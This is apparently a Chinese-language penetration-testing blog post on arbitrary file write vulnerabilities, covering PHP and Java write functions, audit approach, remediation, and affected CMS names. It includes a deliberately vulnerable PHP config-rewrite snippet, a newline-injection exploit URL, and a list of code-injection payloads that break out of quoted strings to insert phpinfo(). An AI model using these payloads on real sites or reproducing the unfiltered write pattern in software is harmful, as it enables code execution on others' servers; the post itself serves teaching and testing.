---
layout: post
title:  "深入理解任意文件写入漏洞"
categories: Web安全
tags: 渗透测试 
author: 0e0w
---

* content
{:toc}
这是一篇关于任意文件写入漏洞的文章。由于作者能力有限，文中定会出现一些错误，请谅解。本文会不定期更新，最近一次更新时间为2020年9月15日。鉴于凡世之忙碌，下一次更新也许是明天，也许是下辈子。
> 任意文件写入不同与文件上传漏洞，有些人也称之为是命令执行漏洞。漏洞出现的原因经常是在后台的一些配置文件修改编辑等处，程序开发过程中将这些配置信息未做好过滤保存到了文件中，用户可以在文件中写入任意的内容，导致漏洞产生。

## 01-基本概述

任意文件写入可以直接Getshell，危害很大。但在渗透测试中，往往出现在Cms中。不进行代码审计的情况下，较难直接获取权限，因为无法判断写入到了那个文件中，但也有例外的情况。关于任意文件写入漏洞，有三个前提条件：

- 文件写入函数的参数用户可控；
- 可控参数没有做好过滤；
- 写入的文件类型为可执行文件。

## 02-代码审计

任意文件写入漏洞代码审计思路：寻找文件写入或文件保存等相关函数，查看函数中变量用户是否可控，是否进行了过滤处理，是否保存到了可执行文件中。一般采用代码审计工具可以很好的找出此类漏洞，对于误报情况较大的情况，只需要人工去逐个分析排查即可。

**一、PHP文件写入**

**相关函数**

- fopen() 创建文件，打开文件或URL。

  ```php
  $file = fopen("admin.php", "w")
  ```

- fwrite() 写入文件

  ```php
  fwrite($file, $str)
  ```

- file_put_contents() 把字符串写入文件

  ```php
  file_put_contents("admin.php","<?PHP phpinfo();?>");
  ```

- fputcsv() 将行数据格式化为CSV格式并写入文件

- fputs() 将字符串写入文件

- socket_write() 写一个 Socket

- session_write_close() 向Session中写入数据并终止Session

- ftp_nb_get() 从FTP服务器上获取文件并写入本地文件

- imagefttext() 使用FreeType2字体将文本写入图像

- imagettftext() 用TrueType字体向图像写入文本

**二、Java文件写入**

**相关函数**

- FileWriter()
- BufferedWriter()

**三、基础绕过方法**

没有任何过滤直接将字符串写入文件的情况还是比较少的。有一部分漏洞是已经对参数做了过滤，但是没有完美过滤，导致使用某些技巧可言绕过。

- 利用换行符来绕过正则匹配。

  ```php
  <?php
  $api = addslashes($_GET['api']);
  $file = file_get_contents('./option.php');
  $file = preg_replace("/\\\$API = '.*';/", "\$API = '{$api}';", $file);
  file_put_contents('./option.php', $file);
  ```

  - update.php?api=aaaaa%27;%0aphpinfo();//
  - update.php?api=aaaaa

- 利用 preg_replace函数的问题。

- 利用 preg_replace() 第二个参数，自动转义反斜线。

- 利用正则\n|$n，将第n个子组替换到文本中

  ```php
  $a = 'aa1234aa';
  $b = preg_replace('/aa(\d+)aa/', 'bb\1bb', $a);
  echo $b;
  ```

- 多次提交进行逃逸。

## 03-渗透测试

在渗透测试中，可以在配置文件修改等地方插入类似的payload，查看当前页面的返回情况，或者是通过以往的经验来判断文件写入的位置。很多情况下，配置文件也并非是写入到了可执行文件中，而是写入到了数据库中。在渗透测试中，任意文件写入有俩种常见的情况：

- 配置文件处任意字符串写入

- 程序安装时install任意字符串写入

**常见payload**

```php
<?php phpinfo();?>
phpinfo();
";phpinfo();//
";@phpinfo();//
';phpinfo();//
‘;phpinfo();//
';@phpinfo();//
\',@phpinfo(),//',
\';phpinfo();//
aaa';phpinfo();%0a//
';%0aphpinfo();//
;phpinfo();
\%27;%0aphpinfo();%23
\%27;%0aphpinfo();//
\%27);%0aphpinfo();%23
\%27);phpinfo();%23
';phpinfo();//
");phpinfo();//
```

## 04-典型案例

出现过任意文件写入漏洞的程序。

- phpcms 
- SeaCms
- Discuz 
- 74cms
- dedecms
- 致远OA v8任意文件写入

## 05-漏洞修复

- 尽量避免在可执行文件中保存字符串内容。
- 对写入的字符串进行完美的过滤。

## 06-参考链接

- https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html
- http://suo.im/5VUqhn
- https://blog.csdn.net/Ca3tie1/article/details/104830356